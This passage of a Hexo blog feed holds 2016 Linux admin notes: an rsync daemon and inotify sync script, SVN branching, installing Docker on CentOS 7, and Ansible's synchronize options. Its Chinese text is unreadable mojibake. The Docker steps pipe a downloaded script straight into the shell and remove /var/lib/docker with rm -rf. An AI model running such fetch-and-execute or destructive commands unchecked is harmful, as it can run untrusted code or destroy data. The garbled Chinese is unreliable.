
TAG_NAME=app_upload_files
# åŒæ­¥ç›®å½•
RSYNC_DIR=/tmp/app_upload_files
USER=user
PASSWD=&quot;passwd&quot;


# å…ˆåˆ›å»º rsync é…ç½®å­˜æ”¾ç›®å½•

[ ! -d $RPATH ] &amp;&amp; mkdir $RPATH

# åˆ›å»ºé…ç½®æ–‡ä»¶

[ ! -f $CONF ] &amp;&amp; touch $CONF
[ ! -f $PASSWD_FILE ] &amp;&amp; touch $PASSWD_FILE
[ ! -f $AUTH ] &amp;&amp; touch $AUTH

cat &gt; $CONF &lt;&lt;EOF
#pidæ–‡ä»¶ä½ç½®
pid file = /var/run/rsyncd.pid
#ç›‘å¬çš„ç«¯å£å·
port = 873

#æœ¬æœºipï¼Œè¯·è‡ªè¡Œä¿®æ”¹ä¸ºè‡ªå·±æœºå™¨çš„ip
address = $ADDRESS
#æ‰§è¡Œè´¦æˆ·
uid = nobody
gid = nobody
use chroot = yes
#æ˜¯å¦åªè¯»
read only = no
#å…è®¸è®¿é—®è®¾ç½® å¯ä»¥é…ipæ®µï¼Œä¹Ÿå¯ä»¥å¤šä¸ªipç©ºæ ¼é—´éš”ï¼Œè¯·æ”¹ä¸ºè‡ªå·±å…è®¸çš„ip
#å¦‚æœå®¢æˆ·ç«¯ä¸åœ¨ä»¥ä¸‹å…è®¸åˆ—è¡¨ä¸­ï¼Œä¼šæŠ¥ @ERROR: access denied to xxx from unknown é”™è¯¯
hosts allow= $ALLOW_IP
hosts deny=*
#æœ€å¤§è¿æ¥æ•°
max connections = 5
motd file = /etc/rsyncd.d/rsyncd.motd
#logæ–‡ä»¶ä½ç½®
log file = /var/log/rsync.log
#è¶…æ—¶æ—¶é—´
timeout = 300

#é…ç½®è¦åŒæ­¥çš„ç›®å½•ï¼Œå¯ä»¥æ·»åŠ å¤šä¸ª
#è‡ªå®šä¹‰åç§°
[$TAG_NAME]
#åŒæ­¥çš„ç›®å½•
path = $RSYNC_DIR
#æ’é™¤çš„æ–‡ä»¶
#exclude from = /etc/rsyncd.d/xxx_exclude_list
list=yes
ignore errors
#è®¤è¯ç”¨æˆ·åç§°
auth users = $USER
#ç”¨æˆ·è®¤è¯æ–‡ä»¶ï¼Œè§æ¥ä¸‹çš„ç¬¬2æ¡
secrets file = /etc/rsyncd.d/rsyncd.secrets
EOF

chmod 600 $CONF
mv /etc/rsyncd.conf{,.bak}
ln -s  $CONF  /etc/rsyncd.conf

echo $PASSWD &gt; $PASSWD_FILE
chmod 600 $PASSWD_FILE

echo &quot;$USER:$PASSWD&quot; &gt; $AUTH
chmod 600 $AUTH


# å¯åŠ¨æœåŠ¡
systemctl enable rsyncd.service
systemctl restart rsyncd.service
systemctl status rsyncd.service

# æ‰§è¡Œå®Œè„šæœ¬å, è¿˜éœ€è‡ªè¡Œé…ç½®é˜²ç«å¢™ç«¯å£ 873
</code></pre><p>ä¸¤å°æœºå™¨éƒ½æ‰§è¡Œè¿™ä¸ªè„šæœ¬</p>
<p>ç„¶åå¯ä»¥ç”¨æ‹‰çš„æ–¹å¼åŒæ­¥:</p>
<pre><code>/usr/bin/rsync -avzP --delete user@server1::app_upload_files /tmp/app_upload_files/ --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>å¦‚æœç”¨æ¨çš„æ–¹å¼:</p>
<pre><code>/usr/bin/rsync -avzP /tmp/app_upload_files/ user@server1::app_upload_files --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>æ³¨æ„<code>/tmp/app_upload_files/</code> å¦‚æœæ”¹æˆ<code>/tmp/app_upload_files</code> (æœ«å°¾å°‘äº†æ–œæ ) æ¨é€è¿‡å»ç›®å½•ç»“æ„ä¼šå˜æˆ<code>/tmp/app_upload_files/app_upload_files</code>, å¦‚æœæç¤º<code>Permission denied</code>, åˆ™æ¨é€ç›®æ ‡ç«¯çš„ rsync é…ç½®æ–‡ä»¶éœ€è¦æŠŠ gid,uid æ”¹æˆ root</p>
<p>ç»“åˆ inotfy è„šæœ¬è¿›è¡Œå®æ—¶åŒæ­¥, åˆ™å¿…é¡»ç”¨æ¨çš„æ–¹å¼, å› ä¸ºæ˜¯ç›‘æ§æœ¬åœ°å˜åŒ–, å‘ç”Ÿå˜åŒ–æ¨é€åˆ°è¿œç«¯</p>
<p>inotify è„šæœ¬:</p>
<pre><code>cat /etc/rsyncd.d/inotify-rsync.sh
#!/bin/bash

# æ­¤è„šæœ¬ç”¨æ¥ç›‘æ§ æºç›®å½•æ–‡ä»¶å¤¹çš„å˜åŒ–, è·Ÿç›®æ ‡æœºå™¨è¿›è¡ŒrsyncåŒæ­¥

set -e
#æºç›®å½•
SRC=/tmp/app_upload_files/
#ç›®æ ‡æœåŠ¡å™¨ip
TARGET=192.168.0.3
#rsync ç”¨æˆ·
USER=hdruser
#rsync tag
TAG=app_upload_files
# å¯†ç æ–‡ä»¶
PASSWD=/etc/rsyncd.d/rsyncd.password

#modify,delete,create,attribè¿™äº›ä¸ºç›‘å¬çš„åŠ¨ä½œï¼Œæ¯”å¦‚å¦‚æœä¸è¦deleteï¼Œé‚£ä¹ˆåˆ é™¤çš„åŠ¨ä½œå°±ä¸ä¼šè§¦å‘åŒæ­¥
/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f%e&apos; -e modify,delete,create,attrib $SRC | while read files
do
/usr/bin/rsync -vzrtopgq  --progress --password-file=$PASSWD $SRC $USER@$TARGET::$TAG
done

# è¿è¡Œæ–¹å¼, ç»™è„šæœ¬èµ‹äºˆæ‰§è¡Œæƒé™, ç„¶åç”¨åå°çš„æ–¹å¼è¿è¡Œ: nohup /etc/rsyncd.d/inotify-rsync.sh &amp;
# åŠ åˆ°å¼€æœºå¯åŠ¨é¡¹: echo &quot;/etc/rsyncd.d/inotify-rsync.sh &amp;&quot; &gt;&gt; /etc/rc.local
</code></pre><p>æ³¨æ„:</p>
<p>nohup /etc/rsyncd.d/inotify-rsync.sh &amp; è¿™ä¸ªè„šæœ¬, å½“ rsync æŠ¥é”™çš„æ—¶å€™, å°±ä¼šè‡ªåŠ¨é€€å‡º</p>
<p>å¦‚æœrsync å¼€å¯delete å‚æ•°, åœ¨åŒæ­¥å¤±è´¥ä¹‹å, éœ€è¦å¤‡ä»½ä¸€ä¸‹æ–‡ä»¶å†æ¢å¤åŒæ­¥, å¦åˆ™å¯èƒ½é€ æˆæ•°æ®ä¸¢å¤±</p>
<p>å‚è€ƒ:</p>
<p><a href="http://xxling.com/blog/article/2093.aspx" target="_blank" rel="external">CentOS7é€šè¿‡rsyncå’Œinotifyè¿›è¡Œå®æ—¶åŒæ­¥</a></p>
<p><a href="https://segmentfault.com/a/1190000002558330" target="_blank" rel="external">å…³äºrsync+inotify-toolså®æ—¶åŒæ­¥æ¨¡å¼</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>rsync è„šæœ¬</p>]]>
    
    </summary>
    
      <category term="Centos 7" scheme="http://yoursite.com/tags/Centos-7/"/>
    
      <category term="rsync" scheme="http://yoursite.com/tags/rsync/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn ç‰ˆæœ¬æ§åˆ¶å‘½ä»¤]]></title>
    <link href="http://yoursite.com/2016/04/26/svn-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/04/26/svn-ç‰ˆæœ¬æ§åˆ¶å‘½ä»¤/</id>
    <published>2016-04-26T10:20:04.000Z</published>
    <updated>2016-04-26T12:19:29.000Z</updated>
    <content type="html"><![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout ç‰¹å®šç‰ˆæœ¬"></a>checkout ç‰¹å®šç‰ˆæœ¬</h3><pre><code>svn checkout &lt;svnåœ°å€&gt; -r  &lt;ç‰ˆæœ¬å·&gt;
</code></pre><h3 id="u521B_u5EFA_u5206_u652F"><a href="#u521B_u5EFA_u5206_u652F" class="headerlink" title="åˆ›å»ºåˆ†æ”¯"></a>åˆ›å»ºåˆ†æ”¯</h3><pre><code>$ svn copy svn://test.evergrande.cn/test/trunk svn://test.evergrande.cn/test/branches/TRY-something -m &apos;make branches TRY-something&apos;
Committing transaction...
Committed revision 7.
</code></pre><p>å¿…é¡»è¦æœ‰trunkå’Œ branches ç›®å½•</p>
<p>å‚è€ƒ: </p>
<p><a href="http://blog.163.com/yang_jianli/blog/static/1619900062010101233015365/" target="_blank" rel="external">svn é€‰æ‹©æŒ‡å®šç‰ˆæœ¬</a></p>
<p><a href="http://xstarcd.github.io/wiki/sysadmin/svn_branch_tag_command.html" target="_blank" rel="external">svnå‘½ä»¤è¡Œåˆ›å»ºå’Œåˆ é™¤åˆ†æ”¯å’Œtags</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout ç‰¹å®šç‰ˆæœ¬"></a>checkou]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker éƒ¨ç½²Gitlab]]></title>
    <link href="http://yoursite.com/2016/04/22/Docker-%E9%83%A8%E7%BD%B2Gitlab/"/>
    <id>http://yoursite.com/2016/04/22/Docker-éƒ¨ç½²Gitlab/</id>
    <published>2016-04-22T09:38:07.000Z</published>
    <updated>2016-05-11T07:40:47.000Z</updated>
    <content type="html"><![CDATA[<p>ç¯å¢ƒ: é˜¿é‡Œäº‘ centos7é•œåƒ, å·²ç»å®‰è£…äº† docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external">(docker å®‰è£…è¯¦æƒ…)</a></p>
<p>å‚è€ƒ:</p>
<p><a href="https://github.com/sameersbn/docker-gitlab#installation" target="_blank" rel="external">sameersbn/gitlab:8.6.6</a></p>
<p><a href="http://www.cnphp6.com/archives/99594" target="_blank" rel="external">ä½¿ç”¨DOCKERæ­å»ºGITLABå®è·µ</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>ç¯å¢ƒ: é˜¿é‡Œäº‘ centos7é•œåƒ, å·²ç»å®‰è£…äº† docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external]]>
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
      <category term="Gitlab" scheme="http://yoursite.com/tags/Gitlab/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 å®‰è£…Docker]]></title>
    <link href="http://yoursite.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://yoursite.com/2016/04/22/Centos-7-å®‰è£…Docker/</id>
    <published>2016-04-22T06:31:15.000Z</published>
    <updated>2016-05-11T07:34:37.000Z</updated>
    <content type="html"><![CDATA[<p>ç¯å¢ƒ:é˜¿é‡Œäº‘ centos7 é•œåƒ</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>1.æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬, å¦‚æœå†…æ ¸å¤ªæ—§, è¯·å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬</p>
<pre><code># uname -r
3.10.0-327.13.1.el7.x86_64

# yum update -y
</code></pre><p>2.å®˜æ–¹è„šæœ¬å®‰è£…</p>
<pre><code># curl -fsSL https://get.docker.com/ | sh
+ sh -c &apos;sleep 3; yum -y -q install docker-engine&apos;
warning: /var/cache/yum/x86_64/7/docker-main-repo/packages/docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm: Header V4 RSA/SHA512 Signature, key ID 2c52609d: NOKEY
Public key for docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm is not installed
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3000 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3001 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
Importing GPG key 0x2C52609D:
 Userid     : &quot;Docker Release Tool (releasedocker) &lt;docker@docker.com&gt;&quot;
 Fingerprint: 5811 8e89 f3a9 1289 7c07 0adb f762 2157 2c52 609d
 From       : https://yum.dockerproject.org/gpg
setsebool:  SELinux is disabled.

If you would like to use Docker as a non-root user, you should now consider
adding your user to the &quot;docker&quot; group with something like:

  sudo usermod -aG docker your-user

Remember that you will have to log out and back in for this to take effect!
</code></pre><p>3.å¯åŠ¨</p>
<pre><code>service docker start
</code></pre><p>4.æµ‹è¯•</p>
<pre><code># docker run hello-world
Unable to find image &apos;hello-world:latest&apos; locally
latest: Pulling from library/hello-world
03f4658f8b78: Pull complete
a3ed95caeb02: Pull complete
Digest: sha256:8be990ef2aeb16dbcb9271ddfe2610fa6658d13f6dfb8bc72074cc1ca36966a7
Status: Downloaded newer image for hello-world:latest

Hello from Docker.
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker Hub account:
 https://hub.docker.com

For more examples and ideas, visit:
 https://docs.docker.com/userguide/
</code></pre><p>5.è®¾ç½®å¼€æœºå¯åŠ¨</p>
<pre><code># chkconfig docker on
Note: Forwarding request to &apos;systemctl enable docker.service&apos;.
Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.
</code></pre><h3 id="u5378_u8F7D"><a href="#u5378_u8F7D" class="headerlink" title="å¸è½½"></a>å¸è½½</h3><pre><code>yum list installed | grep docker
docker-engine.x86_64               1.11.0-1.el7.centos        @docker-main-repo
docker-engine-selinux.noarch       1.11.0-1.el7.centos        @docker-main-repo

yum -y remove docker-engine.x86_64

rm -rf /var/lib/docker
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>ç¯å¢ƒ:é˜¿é‡Œäº‘ centos7 é•œåƒ</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>1.æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬, å¦‚æœå†…æ ¸å¤ªæ—§, è¯·å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬<]]>
    </summary>
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Ansible synchronize]]></title>
    <link href="http://yoursite.com/2016/04/20/Ansible-synchronize/"/>
    <id>http://yoursite.com/2016/04/20/Ansible-synchronize/</id>
    <published>2016-04-20T12:00:58.000Z</published>
    <updated>2016-04-22T03:53:38.000Z</updated>
    <content type="html"><![CDATA[<p>æ³¨æ„å‡ ä¸ªå‚æ•°,[default: no]æˆ–è€…æœ‰ç‰¹æ®Šé…ç½®çš„:</p>
<ul>
<li>copy_links    æ‹·è´è½¯è¿æ¥çš„çœŸå®æ–‡ä»¶, è€Œä¸æ˜¯è½¯è¿æ¥</li>
<li>delete    åœ¨è¿›è¡ŒåŒæ­¥åæ˜¯å¦åˆ é™¤ src ä¸­ä¸å­˜åœ¨çš„æ–‡ä»¶, é»˜è®¤æƒ…å†µä¸‹, æ˜¯ä¼šä¿ç•™ dest ç›®æ ‡æ–‡ä»¶å¤¹åŸå…ˆå°±å­˜åœ¨çš„æ–‡ä»¶</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]æœ¬åœ°æˆ–è€…å§”æ‰˜åˆ°ç›®æ ‡æœº</li>
</ul>
<a id="more"></a>
<h3 id="ansible-doc"><a href="#ansible-doc" class="headerlink" title="ansible-doc"></a>ansible-doc</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">&gt; SYNCHRONIZE</span><br><span class="line"></span><br><span class="line">  This <span class="keyword">is</span> a wrapper around rsync. <span class="keyword">Of</span> course you could just use the</span><br><span class="line">  command action <span class="keyword">to</span> <span class="keyword">call</span> rsync yourself, but you also have <span class="keyword">to</span> add a</span><br><span class="line">  fair number <span class="keyword">of</span> boilerplate options <span class="keyword">and</span> host facts. You still may</span><br><span class="line">  need <span class="keyword">to</span> <span class="keyword">call</span> rsync directly via `command<span class="comment">' or `shell' depending on</span></span><br><span class="line">  your use <span class="keyword">case</span>. The synchronize action <span class="keyword">is</span> meant <span class="keyword">to</span> <span class="keyword">do</span> common things</span><br><span class="line">  <span class="keyword">with</span> `rsync<span class="comment">' easily. It does not provide access to the full power of</span></span><br><span class="line">  rsync, but does make most invocations easier <span class="keyword">to</span> follow.</span><br><span class="line"></span><br><span class="line">Options (= <span class="keyword">is</span> mandatory):</span><br><span class="line"></span><br><span class="line">- archive</span><br><span class="line">        Mirrors the rsync archive flag, enables recursive, links,</span><br><span class="line">        perms, times, owner, <span class="keyword">group</span> flags <span class="keyword">and</span> -D. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- checksum</span><br><span class="line">        <span class="keyword">Skip</span> based <span class="keyword">on</span> checksum, rather than <span class="keyword">mod</span>-time &amp; size; Note that</span><br><span class="line">        that <span class="string">"archive"</span> <span class="keyword">option</span> <span class="keyword">is</span> still enabled <span class="keyword">by</span> <span class="keyword">default</span> - the</span><br><span class="line">        <span class="string">"checksum"</span> <span class="keyword">option</span> will <span class="keyword">not</span> disable it. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- compress</span><br><span class="line">        Compress file data during the transfer. <span class="keyword">In</span> most cases, leave</span><br><span class="line">        this enabled unless it causes problems. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- copy_links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> the item that they point <span class="keyword">to</span> (the referent) <span class="keyword">is</span></span><br><span class="line">        copied, rather than the symlink. (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        no]</span><br><span class="line"></span><br><span class="line">- delete</span><br><span class="line">        Delete files that don<span class="comment">'t exist (after transfer, not before) in</span></span><br><span class="line">        the `src<span class="comment">' path. This option requires `recursive=yes'.</span></span><br><span class="line">        (Choices: yes, no) [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">= dest</span><br><span class="line">        Path <span class="keyword">on</span> the destination machine that will be synchronized <span class="keyword">from</span></span><br><span class="line">        the source; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- dest_port</span><br><span class="line">        Port number <span class="keyword">for</span> ssh <span class="keyword">on</span> the destination host. The</span><br><span class="line">        ansible_ssh_port inventory var takes precedence over this</span><br><span class="line">        value. [<span class="keyword">Default</span>: <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">- dirs</span><br><span class="line">        Transfer directories without recursing (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- existing_only</span><br><span class="line">        <span class="keyword">Skip</span> creating <span class="keyword">new</span> files <span class="keyword">on</span> receiver. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- <span class="keyword">group</span></span><br><span class="line">        <span class="keyword">Preserve</span> <span class="keyword">group</span> (Choices: yes, no) [<span class="keyword">Default</span>: the value <span class="keyword">of</span> the</span><br><span class="line">        archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> symlinks. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- mode</span><br><span class="line">        Specify the direction <span class="keyword">of</span> the synchronization. <span class="keyword">In</span> push mode the</span><br><span class="line">        localhost <span class="keyword">or</span> <span class="keyword">delegate</span> <span class="keyword">is</span> the source; <span class="keyword">In</span> pull mode the remote</span><br><span class="line">        host <span class="keyword">in</span> context <span class="keyword">is</span> the source. (Choices: push, pull) [<span class="keyword">Default</span>:</span><br><span class="line">        push]</span><br><span class="line"></span><br><span class="line">- owner</span><br><span class="line">        <span class="keyword">Preserve</span> owner (super user only) (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        the value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- perms</span><br><span class="line">        <span class="keyword">Preserve</span> permissions. (Choices: yes, no) [<span class="keyword">Default</span>: the value</span><br><span class="line">        <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- recursive</span><br><span class="line">        Recurse <span class="keyword">into</span> directories. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- rsync_opts</span><br><span class="line">        Specify additional rsync options <span class="keyword">by</span> passing <span class="keyword">in</span> an array.</span><br><span class="line">        [<span class="keyword">Default</span>: None]</span><br><span class="line"></span><br><span class="line">- rsync_path</span><br><span class="line">        Specify the rsync command <span class="keyword">to</span> run <span class="keyword">on</span> the remote machine. See</span><br><span class="line">        `--rsync-path<span class="comment">' on the rsync man page.</span></span><br><span class="line"></span><br><span class="line">- rsync_timeout</span><br><span class="line">        Specify a --timeout <span class="keyword">for</span> the rsync command <span class="keyword">in</span> seconds.</span><br><span class="line">        [<span class="keyword">Default</span>: <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">- set_remote_user</span><br><span class="line">        put user@ <span class="keyword">for</span> the remote paths. <span class="keyword">If</span> you have a <span class="keyword">custom</span> ssh</span><br><span class="line">        config <span class="keyword">to</span> define the remote user <span class="keyword">for</span> a host that does <span class="keyword">not</span></span><br><span class="line">        match the inventory user, you should <span class="keyword">set</span> this parameter <span class="keyword">to</span></span><br><span class="line">        <span class="string">"no"</span>. [<span class="keyword">Default</span>: <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">= src</span><br><span class="line">        Path <span class="keyword">on</span> the source machine that will be synchronized <span class="keyword">to</span> the</span><br><span class="line">        destination; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- times</span><br><span class="line">        <span class="keyword">Preserve</span> modification times (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">Notes:  rsync must be installed <span class="keyword">on</span> both the local <span class="keyword">and</span> remote machine.</span><br><span class="line">        Inspect the verbose output <span class="keyword">to</span> validate the destination</span><br><span class="line">        user/host/path are what was expected. The remote user <span class="keyword">for</span> the</span><br><span class="line">        dest path will always be the remote_user, <span class="keyword">not</span> the sudo_user.</span><br><span class="line">        Expect that dest=~/x will be ~&lt;remote_user&gt;/x even <span class="keyword">if</span> <span class="keyword">using</span></span><br><span class="line">        sudo. <span class="keyword">To</span> exclude files <span class="keyword">and</span> directories <span class="keyword">from</span> being</span><br><span class="line">        synchronized, you may add `.rsync-filter<span class="comment">' files to the source</span></span><br><span class="line">        directory.</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXAMPLES:</span><br><span class="line"># Synchronization of src on the control machine to dest on the remote hosts</span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path</span><br><span class="line"></span><br><span class="line"># Synchronization without any <span class="comment">--archive options enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path archive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --recursive</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path recursive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --times, with --checksum option enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path <span class="operator"><span class="keyword">checksum</span>=yes times=<span class="keyword">no</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">without</span> <span class="comment">--archive options enabled except use --links</span></span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">archive</span>=<span class="keyword">no</span> links=yes</span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> two paths <span class="keyword">both</span> <span class="keyword">on</span> the control machine</span><br><span class="line">local_action: synchronize src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> the inventory host <span class="keyword">to</span> the dest <span class="keyword">on</span> the localhost <span class="keyword">in</span></span><br><span class="line">pull <span class="keyword">mode</span></span><br><span class="line">synchronize: <span class="keyword">mode</span>=pull src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> <span class="keyword">delegate</span> host <span class="keyword">to</span> dest <span class="keyword">on</span> the <span class="keyword">current</span> inventory host.</span><br><span class="line"># <span class="keyword">If</span> delegate_to <span class="keyword">is</span> <span class="keyword">set</span> <span class="keyword">to</span> the <span class="keyword">current</span> inventory host, this can be used <span class="keyword">to</span> syncronize</span><br><span class="line"># two directories <span class="keyword">on</span> that host. </span><br><span class="line">synchronize: &gt;</span><br><span class="line">    src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line">    delegate_to: <span class="keyword">delegate</span>.host</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">and</span> <span class="keyword">delete</span> files <span class="keyword">in</span> dest <span class="keyword">on</span> the remote host that <span class="keyword">are</span> <span class="keyword">not</span> <span class="keyword">found</span> <span class="keyword">in</span> src <span class="keyword">of</span> localhost.</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">delete</span>=yes</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">using</span> an alternate rsync command</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> rsync_path=<span class="string">"sudo rsync"</span></span><br><span class="line"></span><br><span class="line"># Example .rsync-filter <span class="keyword">file</span> <span class="keyword">in</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">- <span class="keyword">var</span>       # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> whose <span class="keyword">last</span> part <span class="keyword">is</span> <span class="string">'var'</span></span><br><span class="line">- /<span class="keyword">var</span>      # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> <span class="keyword">starting</span> <span class="keyword">with</span> <span class="string">'var'</span> <span class="keyword">starting</span> <span class="keyword">at</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">+ /<span class="keyword">var</span>/conf # <span class="keyword">include</span> /<span class="keyword">var</span>/conf even though it was previously excluded</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">passing</span> <span class="keyword">in</span> extra rsync options</span><br><span class="line">synchronize: src=/tmp/helloworld dest=/<span class="keyword">var</span>/www/helloword rsync_opts=<span class="comment">--no-motd,--exclude=.git</span></span></span><br></pre></td></tr></table></figure>
<h3 id="u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65"><a href="#u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65" class="headerlink" title="ç”¨æ¥åšç”Ÿäº§ç¯å¢ƒ beta ç¯å¢ƒåŒæ­¥"></a>ç”¨æ¥åšç”Ÿäº§ç¯å¢ƒ beta ç¯å¢ƒåŒæ­¥</h3><p>åŒæ­¥ nginx ä¸»ç›®å½•ä¸‹çš„é…ç½®, é™¤äº† vhost é…ç½®ç›®å½•ä¸åŒæ­¥</p>
<p>ä¸€ä¸ªå‘:</p>
